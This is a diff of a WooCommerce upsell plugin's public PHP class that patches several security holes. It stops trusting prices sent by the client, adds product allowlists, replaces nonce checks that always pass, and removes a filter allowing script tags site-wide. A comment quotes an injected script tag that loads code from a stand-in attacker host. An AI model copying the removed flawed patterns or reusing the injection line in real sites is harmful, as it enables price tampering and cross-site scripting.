@@ -1,5 +1,18 @@
 <?php
 /**
+ * Exit if accessed directly.
+ *
+ * @since      1.0.0
+ * @package    Upsell_Order_Bump_Offer_For_Woocommerce
+ * @subpackage Upsell_Order_Bump_Offer_For_Woocommerce/includes
+ * @author     WP Swings <webmaster@wpswings.com>
+ */
+
+if ( ! defined( 'ABSPATH' ) ) {
+	exit;
+}
+
+/**
  * The public-facing functionality of the plugin.
  *
  * @link       https://wpswings.com/?utm_source=wpswings-official&utm_medium=order-bump-org-backend&utm_campaign=official
@@ -77,12 +90,16 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 		} else {
 			$wps_is_shortcode = false;
 		}
+		$wps_tofw_shortcode = false;
+		if ( shortcode_exists( 'wps_bump_offer_shortcode' ) ) {
+			$wps_tofw_shortcode = true;
+		}
 
 		wp_enqueue_style( $this->plugin_name . 'recommendated_popup', plugin_dir_url( __FILE__ ) . 'css/wps-recommendation-popup.css', array(), $this->version, 'all' );
 
-		if ( is_checkout() || is_cart() || $wps_is_shortcode ) {
+		if ( is_checkout() || is_cart() || $wps_is_shortcode || $wps_tofw_shortcode ) {
 			wp_enqueue_style( $this->plugin_name . '_slick_css', plugin_dir_url( __FILE__ ) . 'css/slick.min.css', array(), $this->version, 'all' );
-			wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/upsell-order-bump-offer-for-woocommerce-public.css', array(), $this->version, 'all' );
+			wp_enqueue_style( $this->plugin_name, plugin_dir_url( __FILE__ ) . 'css/upsell-order-bump-offer-for-woocommerce-public.css', array(), time(), 'all' );
 		}
 
 		wp_enqueue_style( $this->plugin_name . 'one-click-front', plugin_dir_url( __FILE__ ) . 'css/woocommerce_one_click_upsell_funnel_pro-public.css', array(), $this->version, 'all' );
@@ -113,10 +130,15 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			$wps_is_shortcode = false;
 		}
 
+		$wps_tofw_shortcode = false;
+		if ( shortcode_exists( 'wps_bump_offer_shortcode' ) ) {
+				$wps_tofw_shortcode = true;
+		}
+
 		// Js For One CLick Upsell Start.
 		wp_enqueue_script( 'wps-upsell-sweet-alert-js', plugin_dir_url( __FILE__ ) . 'js/sweet-alert.js', array(), '2.1.2', false );
 		// Only enqueue on the Checkout page.
-		if ( is_checkout() || is_cart() || $wps_is_shortcode ) {
+		if ( is_checkout() || is_cart() || $wps_is_shortcode || $wps_tofw_shortcode ) {
 
 			$wps_is_checkout_page = false;
 			$wps_popup_body_class = 'No';
@@ -175,7 +197,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			$wps_bump_popup_exit_intent = ! empty( $wps_ubo_global_options['wps_ubo_enable_popup_exit_intent'] ) ? $wps_ubo_global_options['wps_ubo_enable_popup_exit_intent'] : 'on';
 
 			// Public Script.
-			wp_enqueue_script( 'wps-ubo-lite-public-script', plugin_dir_url( __FILE__ ) . 'js/wps_ubo_lite_public_script.js', array( 'jquery', 'wp-element', 'wp-plugins', 'wp-data', 'wc-blocks-checkout' ), $this->version, false );
+			wp_enqueue_script( 'wps-ubo-lite-public-script', plugin_dir_url( __FILE__ ) . 'js/wps_ubo_lite_public_script.js', array( 'jquery', 'wp-element', 'wp-plugins', 'wp-data', 'wc-blocks-checkout' ), time(), false );
 			wp_enqueue_script( 'wps-ubo-lite-public-script-new', plugin_dir_url( __FILE__ ) . 'js/wps_ubo_lite_public_script_new_template.js', array( 'jquery' ), $this->version, false );
 
 			// Checkout Block and Cart block Comaptibility.
@@ -199,6 +221,9 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 				'wps_enable_cart_upsell' => $bump_cart_offer_enable,
 				'wps_is_checkout_block_use' => $wps_traditional_checkout,
 				'wps_is_cart_block_use' => $wps_traditional_cart,
+				'wps_popup_type' => get_option( 'wps_ubo_popup_type', 'lightbox' ),
+				'wps_delay_time' => get_option( 'wps_ubo_popup_delay', 3 ),
+
 			);
 
 			// Timer Functionality starts.
@@ -324,7 +349,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 		);
 
 		// Public facing regarding popup.
-		wp_enqueue_script( 'wps-ubo-lite-public-script-for-fbt', plugin_dir_url( __FILE__ ) . 'js/wps_ubo_lite_fbt.js', array( 'jquery' ), $this->version, false );
+		wp_enqueue_script( 'wps-ubo-lite-public-script-for-fbt', plugin_dir_url( __FILE__ ) . 'js/wps_ubo_lite_fbt.js', array( 'jquery' ), time(), false );
 		wp_localize_script(
 			'wps-ubo-lite-public-script-for-fbt',
 			'wps_ubo_lite_public_fbt',
@@ -357,14 +382,11 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			);
 		}
 
-		$secure_nonce      = wp_create_nonce( 'wps-upsell-auth-nonce' );
-		$id_nonce_verified = wp_verify_nonce( $secure_nonce, 'wps-upsell-auth-nonce' );
-
-		if ( $id_nonce_verified ) {
-			$is_upsell_page = '';
-			if ( isset( $_GET['ocuf_ns'] ) ) {
-				$is_upsell_page = true;
-			}
+		// Treat as upsell page only when the request carries a valid funnel offer nonce.
+		$is_upsell_page = false;
+		if ( isset( $_GET['ocuf_ns'] ) ) {
+			$upsell_offer_nonce = sanitize_text_field( wp_unslash( $_GET['ocuf_ns'] ) );
+			$is_upsell_page     = (bool) wp_verify_nonce( $upsell_offer_nonce, 'funnel_offers' );
 		}
 
 		if ( ! empty( $is_upsell_page ) && ! wps_is_plugin_active_with_version( 'upsell-order-bump-offer-for-woocommerce-pro/upsell-order-bump-offer-for-woocommerce-pro.php', '3.0.0' ) ) {
@@ -378,8 +400,6 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 				'woocommerce-one-click-upsell-public-exit-intent-script-lite',
 				'wps_upsell_public_exit',
 				array(
-					'ajaxurl'                => admin_url( 'admin-ajax.php' ),
-					'nonce'                  => wp_create_nonce( 'wps_wocuf_nonce' ),
 					'skip_enabled'           => $upsell_skip_function,
 					'skip_message'           => $upsell_exit_intent_message,
 				)
@@ -1077,9 +1097,11 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 
 							$value['data']->set_price( $bump_price );
 						} else {
+							$price_discount = number_format( $price_discount, 2, '.', '' );
 							$value['data']->set_price( $price_discount );
 						}
 					} else {
+						$price_discount = number_format( $price_discount, 2, '.', '' );
 						$value['data']->set_price( $price_discount );
 					}
 				}
@@ -2225,10 +2247,29 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 		if ( isset( $_POST['wps_product_id'] ) ) {
 
 			$wps_product_id = isset( $_POST['wps_product_id'] ) ? absint( $_POST['wps_product_id'] ) : '';
-			$wps_product_price = isset( $_POST['wps_product_price'] ) ? absint( $_POST['wps_product_price'] ) : '';
 
 			$wps_target_product_id = isset( $_POST['wps_target_product_id'] ) ? absint( $_POST['wps_target_product_id'] ) : '';
 			$wps_target_var_product_id = isset( $_POST['wps_variation_product_id'] ) ? absint( $_POST['wps_variation_product_id'] ) : '';
+			$wps_recommended_product = wc_get_product( $wps_product_id );
+			if ( empty( $wps_recommended_product ) || ! $wps_recommended_product->is_purchasable() ) {
+				wp_send_json_error();
+			}
+
+			$wps_allowed_product_ids = array();
+			$wps_allowed_products    = get_post_meta( $wps_target_product_id, 'wps_recommendated_product_ids' );
+			foreach ( $wps_allowed_products as $wps_allowed_product ) {
+				if ( is_array( $wps_allowed_product ) ) {
+					$wps_allowed_product_ids = array_merge( $wps_allowed_product_ids, array_map( 'absint', $wps_allowed_product ) );
+				} else {
+					$wps_allowed_product_ids[] = absint( $wps_allowed_product );
+				}
+			}
+
+			if ( ! in_array( $wps_product_id, array_filter( $wps_allowed_product_ids ), true ) ) {
+				wp_send_json_error();
+			}
+
+			$wps_product_price = (float) $wps_recommended_product->get_price();
 
 			if ( ! empty( $wps_target_var_product_id ) ) {
 				$wps_select_option_discount = get_post_meta( $wps_target_var_product_id, 'wps_select_option_discount', true );
@@ -2242,19 +2283,29 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			if ( 'no_disc' == $wps_select_option_discount ) {
 
 				// Add the product to the cart when no discount is set.
-				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => $wps_product_price ) );
+				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => wc_format_decimal( $wps_product_price ) ) );
 			} elseif ( 'wps_percent' == $wps_select_option_discount ) {
+
+				if ( ! is_numeric( $wps_recommendation_discount_val ) ) {
+					wp_send_json_error();
+				}
 
 				// Get the discounted price.
 				$discount_percentage = $wps_recommendation_discount_val / 100;
 				$custom_discounted_price = $wps_product_price * ( 1 - $discount_percentage );
 
 				// Add the product to the cart with Discounted Price.
-				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => $custom_discounted_price ) );
+				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => wc_format_decimal( max( 0, $custom_discounted_price ) ) ) );
 			} elseif ( 'wps_fixed' == $wps_select_option_discount ) {
 
+				if ( ! is_numeric( $wps_recommendation_discount_val ) ) {
+					wp_send_json_error();
+				}
+
 				// Add the product to the cart with Fixed Price.
-				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => $wps_recommendation_discount_val ) );
+				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => wc_format_decimal( max( 0, (float) $wps_recommendation_discount_val ) ) ) );
+			} else {
+				WC()->cart->add_to_cart( $wps_product_id, 1, 0, array(), array( 'wps_cart_offer_custom_price' => wc_format_decimal( $wps_product_price ) ) );
 			}
 			// Return a success response.
 			$data = array(
@@ -2279,10 +2330,10 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	public function wps_add_custom_price_to_cart_item( $cart_object ) {
 		foreach ( $cart_object->get_cart() as $item ) {
 
-			if ( array_key_exists( 'wps_cart_offer_custom_price', $item ) ) {
+			if ( array_key_exists( 'wps_cart_offer_custom_price', $item ) && is_numeric( $item['wps_cart_offer_custom_price'] ) ) {
 				$item['data']->set_price( $item['wps_cart_offer_custom_price'] );
 			}
-			if ( array_key_exists( 'fbt_price', $item ) ) {
+			if ( array_key_exists( 'fbt_price', $item ) && is_numeric( $item['fbt_price'] ) ) {
 				$item['data']->set_price( $item['fbt_price'] );
 			}
 		}
@@ -2468,7 +2519,6 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 											$wps_html_discount_section .= '<input id="wps_cart_offer_quantity" type="hidden" value ="1">';
 											$wps_html_discount_section .= '<input id="wps_cart_offer_product_id_' . $value . '" type="hidden" value =' . $cart_item['product_id'] . '>';
 											$wps_html_discount_section .= '<input class ="wps_offered_product_id" type="hidden" value =' . $value . '>';
-											$wps_html_discount_section .= '<input id="wps_cart_offer_product_price_' . $value . '" type="hidden" value =' . $product->get_price() . '>';
 											$wps_html_discount_section .= '</div>';
 										}
 									}
@@ -2494,70 +2544,85 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 		 check_ajax_referer( 'wps_ubo_lite_nonce_recommend', 'nonce' );
 		$parent_product_id = isset( $_POST['parent_product_id'] ) ? absint( $_POST['parent_product_id'] ) : '';
 		$child_product_id = isset( $_POST['child_product_id'] ) ? absint( $_POST['child_product_id'] ) : '';
-		$wps_cart_offer_product_price = isset( $_POST['wps_cart_offer_product_price'] ) ? absint( $_POST['wps_cart_offer_product_price'] ) : '';
 		$wps_cart_offer_quantity_value = isset( $_POST['wps_cart_offer_quantity_value'] ) ? absint( $_POST['wps_cart_offer_quantity_value'] ) : '';
-		$wps_cart_offer_product_id_value = ! empty( $_POST['wps_cart_offer_product_id_value'] ) ? sanitize_text_field( wp_unslash( $_POST['wps_cart_offer_product_id_value'] ) ) : '';
+		$wps_cart_offer_product_id_value = ! empty( $_POST['wps_cart_offer_product_id_value'] ) ? absint( $_POST['wps_cart_offer_product_id_value'] ) : '';
 
 		$message = '';
-		$wps_discount_price = '';
+		$result = false;
 
 		$wps_offer_product_discount_type = get_post_meta( $wps_cart_offer_product_id_value, 'wps_select_option_discount' );
 		$wps_offer_product_discount_val = get_post_meta( $wps_cart_offer_product_id_value, 'wps_recommendation_discount_val' );
 
 		$product = wc_get_product( $parent_product_id );
+		if ( empty( $product ) || empty( $wps_cart_offer_product_id_value ) || empty( $wps_cart_offer_quantity_value ) ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'Invalid cart offer request.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+		}
 
-		if ( $product->is_type( 'variable' ) ) {
-			try {
-				if ( ! empty( $child_product_id ) ) {
-					// Get the variation object.
-					$variation_product = wc_get_product( $child_product_id );
-					// Get the price of the variation.
-					$variation_price = $variation_product->get_price();
-					$wps_discount_price = $this->wps_get_cart_offer_discount_value( $wps_offer_product_discount_type, $wps_offer_product_discount_val, $variation_price );
-					// Create an array of product data to add to the cart.
-					$cart_item_data = array(
-						'_price' => $wps_discount_price, // Set the discounted price.
-					);
-					// Add the product to the cart.
-					$result = WC()->cart->add_to_cart( $child_product_id, $wps_cart_offer_quantity_value, 0, array(), $cart_item_data );
-				}
-
-				if ( $result ) {
-					// Product added to the cart successfully.
-					$message = 'remove';
-					wc_add_notice( 'Cart Offer Successfully Added To cart.', 'success' );
-				} else {
-					// Product could not be added to the cart (e.g., if it's out of stock).
-					$message = 'Product could not be added to the cart.';
-					wc_add_notice( 'Cart Offer Unable  To  Add To cart.', 'error' );
-				}
-			} catch ( \Exception $e ) {
-				wc_add_notice( 'Unexpected error occurred.', 'error' );
+		$wps_allowed_product_ids = array();
+		$wps_allowed_products    = get_post_meta( $wps_cart_offer_product_id_value, 'wps_recommendated_product_ids' );
+		foreach ( $wps_allowed_products as $wps_allowed_product ) {
+			if ( is_array( $wps_allowed_product ) ) {
+				$wps_allowed_product_ids = array_merge( $wps_allowed_product_ids, array_map( 'absint', $wps_allowed_product ) );
+			} else {
+				$wps_allowed_product_ids[] = absint( $wps_allowed_product );
 			}
+		}
+		$wps_allowed_product_ids = array_filter( $wps_allowed_product_ids );
+		if ( ! in_array( $parent_product_id, $wps_allowed_product_ids, true ) ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'Invalid cart offer product.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+		}
+
+		$wps_origin_product_in_cart = false;
+		foreach ( WC()->cart->get_cart() as $cart_item ) {
+			if ( isset( $cart_item['product_id'] ) && absint( $cart_item['product_id'] ) === $wps_cart_offer_product_id_value ) {
+				$wps_origin_product_in_cart = true;
+				break;
+			}
+		}
+
+		if ( ! $wps_origin_product_in_cart ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'Cart offer is not available for this cart.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+		}
+
+		try {
+			if ( $product->is_type( 'variable' ) ) {
+				if ( empty( $child_product_id ) ) {
+					wp_send_json_error( array( 'message' => esc_html__( 'Invalid cart offer variation.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+				}
+
+				$variation_product = wc_get_product( $child_product_id );
+				if ( empty( $variation_product ) || absint( $variation_product->get_parent_id() ) !== $parent_product_id || ! $variation_product->is_purchasable() ) {
+					wp_send_json_error( array( 'message' => esc_html__( 'Invalid cart offer variation.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+				}
+
+				$wps_base_price = (float) $variation_product->get_price();
+				$wps_discount_price = $this->wps_get_cart_offer_discount_value( $wps_offer_product_discount_type, $wps_offer_product_discount_val, $wps_base_price );
+				$cart_item_data = array(
+					'_price' => wc_format_decimal( $wps_discount_price ), // Set the discounted price.
+				);
+
+				$result = WC()->cart->add_to_cart( $parent_product_id, $wps_cart_offer_quantity_value, $child_product_id, array(), $cart_item_data );
+			} elseif ( $product->is_purchasable() ) {
+				$wps_base_price = (float) $product->get_price();
+				$wps_discount_price = $this->wps_get_cart_offer_discount_value( $wps_offer_product_discount_type, $wps_offer_product_discount_val, $wps_base_price );
+				$cart_item_data = array(
+					'_price' => wc_format_decimal( $wps_discount_price ), // Set the discounted price.
+				);
+
+				$result = WC()->cart->add_to_cart( $parent_product_id, $wps_cart_offer_quantity_value, 0, array(), $cart_item_data );
+			}
+		} catch ( \Exception $e ) {
+			wc_add_notice( 'Unexpected error occurred.', 'error' );
+		}
+
+		if ( $result ) {
+			// Product added to the cart successfully.
+			$message = 'remove';
+			wc_add_notice( 'Cart Offer Successfully Added To cart.', 'success' );
 		} else {
-
-			try {
-				if ( ! empty( $parent_product_id ) ) {
-					$wps_discount_price = $this->wps_get_cart_offer_discount_value( $wps_offer_product_discount_type, $wps_offer_product_discount_val, $wps_cart_offer_product_price );
-					$cart_item_data = array(
-						'_price' => $wps_discount_price, // Set the discounted price.
-					);
-
-					$result = WC()->cart->add_to_cart( $parent_product_id, $wps_cart_offer_quantity_value, 0, array(), $cart_item_data );
-				}
-
-				if ( $result ) {
-					// Product added to the cart successfully.
-					$message = 'remove';
-					wc_add_notice( 'Cart Offer Successfully Added To cart.', 'success' );
-				} else {
-					// Product could not be added to the cart (e.g., if it's out of stock).
-					$message = 'Product could not be added to the cart.';
-					wc_add_notice( 'Cart Offer Unable  To  Add To cart.', 'error' );
-				}
-			} catch ( \Exception $e ) {
-				wc_add_notice( 'Unexpected error occurred.', 'error' );
-			}
+			// Product could not be added to the cart (e.g., if it's out of stock).
+			$message = 'Product could not be added to the cart.';
+			wc_add_notice( 'Cart Offer Unable  To  Add To cart.', 'error' );
 		}
 
 		$response = array(
@@ -2565,8 +2630,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			'message' => $message,
 		);
 
-		echo wp_json_encode( $response );
-		wp_die();
+		wp_send_json( $response );
 	}
 
 	/**
@@ -2579,7 +2643,12 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	 */
 	public function wps_get_cart_offer_discount_value( $wps_offer_product_discount_type, $wps_offer_product_discount_val, $wps_cart_offer_product_price ) {
 
+		$wps_discounted_price = (float) $wps_cart_offer_product_price;
 		if ( is_array( $wps_offer_product_discount_type ) && ! empty( $wps_offer_product_discount_type ) && is_array( $wps_offer_product_discount_val ) && ! empty( $wps_offer_product_discount_val ) ) {
+			if ( ! is_numeric( $wps_offer_product_discount_val[0] ) && 'no_disc' !== $wps_offer_product_discount_type[0] ) {
+				return $wps_discounted_price;
+			}
+
 			if ( 'wps_percent' == $wps_offer_product_discount_type[0] ) {   // For the Percentaged count.
 				// Get the product's regular price.
 				$regular_price = floatval( $wps_cart_offer_product_price );
@@ -2596,7 +2665,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 			}
 		}
 
-		return $wps_discounted_price;
+		return max( 0, (float) $wps_discounted_price );
 	}
 
 	/**
@@ -2609,7 +2678,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 
 		foreach ( $cart_object->get_cart() as $item ) {
 
-			if ( array_key_exists( '_price', $item ) ) {
+			if ( array_key_exists( '_price', $item ) && is_numeric( $item['_price'] ) ) {
 				$item['data']->set_price( $item['_price'] );
 			}
 		}
@@ -2660,26 +2729,65 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	 * @since    1.0.0
 	 */
 	public function wps_add_to_cart_fbt_product_callback() {
-		$secure_nonce      = wp_create_nonce( 'wps-upsell-auth-nonce' );
-		$id_nonce_verified = wp_verify_nonce( $secure_nonce, 'wps-upsell-auth-nonce' );
-		if ( ! $id_nonce_verified ) {
-			wp_die( esc_html__( 'Nonce Not verified', 'upsell-order-bump-offer-for-woocommerce' ) );
+		check_ajax_referer( 'wps_ubo_lite_nonce_recommend', 'nonce' );
+
+		if ( ! function_exists( 'WC' ) || empty( WC()->cart ) ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'Cart is unavailable.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
 		}
-		$wps_product_id = isset( $_POST['wps_product_id'] ) ? array_map( 'sanitize_text_field', wp_unslash( $_POST['wps_product_id'] ) ) : array();
+
+		$wps_product_id = isset( $_POST['wps_product_id'] ) ? array_map( 'absint', wp_unslash( $_POST['wps_product_id'] ) ) : array();
 		$wps_main_product_id = isset( $_POST['wps_main_prod_id'] ) ? absint( $_POST['wps_main_prod_id'] ) : '';
-		// Loop through each product and add it to the cart.
-		foreach ( $wps_product_id as $product_id ) {
-			$product = wc_get_product( $product_id );
-			$price = $product->get_price();
-			$discount = $this->wps_custom_discount_price( $price, $wps_main_product_id, $wps_method_upsell = 'yes' );
-			// Add the product to the cart.
-			WC()->cart->add_to_cart( $product_id, 1, 0, array(), array( 'fbt_price' => $discount ) );
+
+		$wps_main_product = wc_get_product( $wps_main_product_id );
+		if ( empty( $wps_main_product ) || empty( $wps_product_id ) ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'Invalid frequently bought together request.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
 		}
+
+		$wps_allowed_product_ids = array();
+		$wps_allowed_products    = get_post_meta( $wps_main_product_id, 'wps_recommendated_product_ids' );
+		foreach ( $wps_allowed_products as $wps_allowed_product ) {
+			if ( is_array( $wps_allowed_product ) ) {
+				$wps_allowed_product_ids = array_merge( $wps_allowed_product_ids, array_map( 'absint', $wps_allowed_product ) );
+			} else {
+				$wps_allowed_product_ids[] = absint( $wps_allowed_product );
+			}
+		}
+		$wps_allowed_product_ids = array_filter( $wps_allowed_product_ids );
+		if ( empty( $wps_allowed_product_ids ) ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'No frequently bought together products are configured.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+		}
+
+		$wps_added_product = false;
+
+		// Loop through each product and add it to the cart.
+		foreach ( array_unique( $wps_product_id ) as $product_id ) {
+			if ( ! in_array( $product_id, $wps_allowed_product_ids, true ) ) {
+				continue;
+			}
+
+			$product = wc_get_product( $product_id );
+			if ( empty( $product ) || ! $product->is_purchasable() ) {
+				continue;
+			}
+
+			$price = (float) $product->get_price();
+			$discount = $this->wps_custom_discount_price( $price, $wps_main_product_id, 'yes' );
+			if ( ! is_numeric( $discount ) ) {
+				$discount = $price;
+			}
+
+			// Add the product to the cart.
+			$wps_added_product = WC()->cart->add_to_cart( $product_id, 1, 0, array(), array( 'fbt_price' => wc_format_decimal( $discount ) ) ) || $wps_added_product;
+		}
+
+		if ( ! $wps_added_product ) {
+			wp_send_json_error( array( 'message' => esc_html__( 'No valid frequently bought together products were added.', 'upsell-order-bump-offer-for-woocommerce' ) ) );
+		}
+
 		$data = array(
 			'wps_product_added'  => 'yes',
 		);
-		echo wp_json_encode( $data );
-		wp_die();
+		wp_send_json( $data );
 	}
 
 
@@ -2699,6 +2807,10 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 		$wps_recommendation_discount_val = get_post_meta( $wps_target_product_id, 'wps_fbt_discount_val', true );
 
 		$wps_discounted_price = '';
+		if ( ! is_numeric( $wps_recommendation_discount_val ) && 'no_disc' !== $wps_select_option_discount ) {
+			return (float) $wps_product_price;
+		}
+
 		if ( 'no_disc' == $wps_select_option_discount ) {
 
 			$wps_discounted_price = $wps_product_price;
@@ -2717,7 +2829,11 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 				$wps_discounted_price = 0;
 			}
 		}
-		return $wps_discounted_price;
+		if ( ! is_numeric( $wps_discounted_price ) ) {
+			$wps_discounted_price = $wps_product_price;
+		}
+
+		return max( 0, (float) $wps_discounted_price );
 	}
 
 
@@ -4592,19 +4708,24 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	}
 
 	/**
-	 * Allow Script tags in wp_kses
+	 * REMOVED: wocuf_lite_allow_script_tags() function has been removed entirely.
 	 *
-	 * @param array $allowedposttags allowed post tags.
-	 * @return array
+	 * Security Fix: The wp_kses_allowed_html filter that this function was hooked to has been removed.
+	 * The plugin uses wp_add_inline_script() for custom JavaScript (see post_global_custom_js method),
+	 * which is the secure WordPress-recommended way to add scripts. The previous wp_kses_allowed_html
+	 * filter was creating a site-wide XSS vulnerability because:
+	 *
+	 * 1. It allowed <script> tags in the 'post' context site-wide
+	 * 2. The 'post' context is used by wp_kses_post(), content_save_pre, and excerpt_save_pre
+	 * 3. WordPress routes content from Contributors and Authors (users without unfiltered_html capability)
+	 *    through these filters when they create/edit posts
+	 * 4. This meant any Contributor or Author could inject <script src="//attacker.tld/x.js"></script>
+	 *    into post content, which would execute for administrators reviewing the content and all site visitors
+	 * 5. Comments were also affected, allowing unauthenticated attackers to inject scripts
+	 *
+	 * The fix: This function and its filter registration have been completely removed.
+	 * The plugin's functionality is not affected because wp_add_inline_script() is already being used correctly.
 	 */
-	public function wocuf_lite_allow_script_tags( $allowedposttags ) {
-		$allowedposttags['script'] = array(
-			'src'    => true,
-			'height' => true,
-			'width'  => true,
-		);
-		return $allowedposttags;
-	}
 
 	/**
 	 * Initiate Upsell Orders before processing payment in case of checkout shortcode.
@@ -5546,7 +5667,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	public function wps_wocuf_pro_charge_the_offer() {
 		$add_product_nonce = ! empty( $_POST['wps_wocuf_post_nonce'] ) ? sanitize_text_field( wp_unslash( $_POST['wps_wocuf_post_nonce'] ) ) : '';
 
-	if ( ( isset( $add_product_nonce ) && wp_verify_nonce( $add_product_nonce, 'wps_wocuf_field_post_nonce' ) && isset( $_POST['wps_wocuf_pro_buy'] ) ) || isset( $_GET['wps_wocuf_pro_buy'] ) ) {
+		if ( ( isset( $add_product_nonce ) && wp_verify_nonce( $add_product_nonce, 'wps_wocuf_field_post_nonce' ) && isset( $_POST['wps_wocuf_pro_buy'] ) ) || isset( $_GET['wps_wocuf_pro_buy'] ) ) {
 
 			unset( $_POST['wps_wocuf_pro_buy'] );
 
@@ -5704,7 +5825,7 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 							$funnel_offer_post_id_assigned = ! empty( $wps_wocuf_pro_all_funnels[ $funnel_id ]['wps_upsell_post_id_assigned'][ $offer_id ] ) ? $wps_wocuf_pro_all_funnels[ $funnel_id ]['wps_upsell_post_id_assigned'][ $offer_id ] : '';
 
 							// When funnel is saved since v3.0.0 and offer post id is assigned and elementor active.
-						if ( ( ! empty( $funnel_offer_post_id_assigned ) && 'true' === $funnel_saved_after_version_3 && wps_upsell_lite_elementor_plugin_active_funnel_builder() ) || wps_upsell_divi_builder_plugin_active_funnel_builder() ) {
+							if ( ( ! empty( $funnel_offer_post_id_assigned ) && 'true' === $funnel_saved_after_version_3 && wps_upsell_lite_elementor_plugin_active_funnel_builder() ) || wps_upsell_divi_builder_plugin_active_funnel_builder() ) {
 
 								$redirect_to_upsell = false;
 
@@ -7000,24 +7121,25 @@ class Upsell_Order_Bump_Offer_For_Woocommerce_Public {
 	 * @return int
 	 */
 	public function wps_ubo_convert_diffrent_currency_base_price_callback( $price ) {
-		if ( class_exists( 'WOOCS' ) ) {
-			global $WOOCS;
+		if ( class_exists( 'WOOCS' ) && ! empty( $GLOBALS['WOOCS'] ) ) {
+			$w_o_o_c_s = $GLOBALS['WOOCS'];
 			$amount = 0;
 
-			if ( $WOOCS->is_multiple_allowed ) {
-				$currrent = $WOOCS->current_currency;
-				if ( $currrent != $WOOCS->default_currency ) {
+			if ( $w_o_o_c_s->is_multiple_allowed ) {
+				$currrent = $w_o_o_c_s->current_currency;
+				if ( $currrent != $w_o_o_c_s->default_currency ) {
 
-					$currencies = $WOOCS->get_currencies();
+					$currencies = $w_o_o_c_s->get_currencies();
 					$rate       = $currencies[ $currrent ]['rate'];
-					$amount     = $price / ( $rate );
-					return round( $amount );
+					$amount     = $price / $rate;
+
+					return round( $amount, 2 );
 				} else {
-					return round( $price );
+					return round( $price, 2 );
 				}
 			}
 		}
-		return round( $price );
+		return round( $price, 2 );
 	}
 
 	// End of class.
